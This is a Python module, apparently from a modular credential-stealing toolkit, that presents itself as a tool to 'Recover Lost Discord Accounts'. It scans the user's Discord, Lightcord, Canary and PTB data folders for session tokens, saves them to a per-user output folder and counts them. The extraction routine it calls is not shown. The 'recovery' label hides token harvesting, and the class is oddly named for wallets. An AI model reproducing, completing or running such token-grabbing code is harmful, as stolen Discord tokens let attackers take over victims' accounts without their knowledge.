import json
import os
import re


from config import Constant 
from config import ModuleManager


class WalletsRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="WalletsRecovery")

        self.banner(r"""
     _______         ______  _                          _ 
    |.-----.|       (______)(_)                        | |
    ||x . x||        _     _ _  ___  ____ ___   ____ __| |
    ||_.-._||       | |   | | |/___)/ ___) _ \ / ___) _  |
    `--)-(--`       | |__/ /| |___ ( (__| |_| | |  ( (_| |
   __[=== o]___     |_____/ |_(___/ \____)___/|_|   \____|
  |:::::::::::|\    
  `-=========-`()       Recover Lost Discord Accounts
                """)

        self.discord_folder = os.path.join(self.output_folder_user, 'applications', 'discord')

        if not os.path.isdir(self.discord_folder):
            os.makedirs(self.discord_folder)
        
        self.discordInstallations = [
                [f"{Constant.roaming_dir}/Discord","Discord"],
                [f"{Constant.roaming_dir}/Lightcord","Lightcord"],
                [f"{Constant.roaming_dir}/discordcanary","DiscordCanary"],
                [f"{Constant.roaming_dir}/discordptb","DiscordPTB"]
        ]
        



    def run(self):
        try:
            self.mdebug(f"Starting to look for discord tokens")
            
            for patt in self.discordInstallations:
                self.mdebug(f"Running `GetDiscord()` on {patt[1]} at {patt[0]}")
                self.GetDiscord(path=patt[0], savefname=patt[1])
            
            self.mprint(f"Found a total of {self.tokensCount} Discord Tokens")

        except Exception as e:
            self.merror(f"Unable to locate any discord token: {e}. Skipping this module")
            return
